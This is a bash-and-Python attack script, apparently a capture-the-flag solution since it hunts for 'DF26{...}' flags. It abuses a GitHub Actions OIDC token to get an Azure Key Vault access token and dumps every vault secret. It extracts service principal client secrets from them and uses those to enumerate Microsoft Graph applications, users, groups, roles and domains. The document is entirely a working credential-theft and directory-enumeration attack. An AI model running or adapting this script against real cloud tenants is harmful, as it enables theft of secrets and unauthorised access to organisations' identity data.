#!/usr/bin/env bash
set -u
: "${AZURE_CLIENT_ID:=72ff278a-9e71-43ec-bac4-2ca303f8e462}"
: "${AZURE_TENANT_ID:=3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d client_id="${AZURE_CLIENT_ID}" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
export VT
python3 - <<'PY'
import os,json,urllib.request,urllib.parse,re
VT=os.environ["VT"]; TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
def rq(u,t):
    try:return urllib.request.urlopen(urllib.request.Request(u,headers={"Authorization":"Bearer "+t}),timeout=25).read().decode()
    except Exception as e:
        try:return "ERR:"+e.read().decode()[:150]
        except:return "ERR:"+str(e)
def tok(c,x,sc):
    d=urllib.parse.urlencode({"client_id":c,"client_secret":x,"grant_type":"client_credentials","scope":sc}).encode()
    try:return json.load(urllib.request.urlopen(f"https://login.microsoftonline.com/{TID}/oauth2/v2.0/token",d,timeout=20)).get("access_token")
    except:return None
def hit(tag,s):
    for m in set(re.findall(r'DF26\{[^}]*\}',s)):print("  !!!FLAG",tag,":"," ".join(m))
PV="https://kv-tbl-prod-x3euoz.vault.azure.net"
sps=[]
for s in json.loads(rq(PV+"/secrets?api-version=7.4",VT))["value"]:
    try:
        j=json.loads(json.loads(rq(s["id"]+"?api-version=7.4",VT))["value"]);sps.append((s["id"].rsplit("/",1)[-1],j["appId"],j["clientSecret"]))
    except:pass
G="https://graph.microsoft.com/v1.0/"
GB="https://graph.microsoft.com/beta/"
EPS=[
 "applications?$select=displayName,appId,notes,tags,identifierUris,info,appRoles&$top=200",
 "servicePrincipals?$select=displayName,appId,notes,tags,homepage,replyUrls,servicePrincipalNames,appDescription,info&$top=200",
 "users?$select=displayName,userPrincipalName,jobTitle,department,aboutMe,employeeId,officeLocation,mail&$top=200",
 "groups?$select=displayName,description,mail&$top=200",
 "directoryRoles","administrativeUnits?$select=displayName,description","organization","domains",
]
done=set()
for name,cid,sec in sps:
    gt=tok(cid,sec,"https://graph.microsoft.com/.default")
    if not gt:continue
    # test access
    me=rq(G+"applications?$top=1",gt)
    if me.startswith("ERR"):
        print(f"[{name}] graph: {me[:70]}");continue
    print(f"[{name}] graph OK")
    for ep in EPS:
        key=ep.split("?")[0]
        if key in done and name!='directory-audit-principal':continue
        d=rq(G+ep,gt)
        if d.startswith("ERR"):continue
        done.add(key)
        hit(f"{name}:{ep}",d)
        # in notes/description không rỗng
        try:
            for o in json.loads(d).get("value",[]):
                for f in ("notes","description","aboutMe","appDescription","info"):
                    v=o.get(f)
                    if v and str(v) not in ("None","{}","[]"):print(f"   {key}.{f} [{o.get('displayName','')}]:",str(v)[:200])
        except:pass
    # resolve 2 app bí ẩn + appRoles
    for ai in ["462d1c38-4459-48b8-9333-82e389e59514","891fb158-e02c-4428-a885-53b811f369c0"]:
        for coll in ["applications","servicePrincipals"]:
            d=rq(G+f"{coll}?$filter=appId eq '{ai}'",gt);hit(f"{ai}",d)
            try:
                for o in json.loads(d).get("value",[]):
                    print(f"   {coll} {ai}: name={o.get('displayName')} notes={o.get('notes')} roles={[r.get('value') for r in o.get('appRoles',[])]}")
            except:pass
    break  # một SP đọc được graph là đủ
print("== done ==")
PY
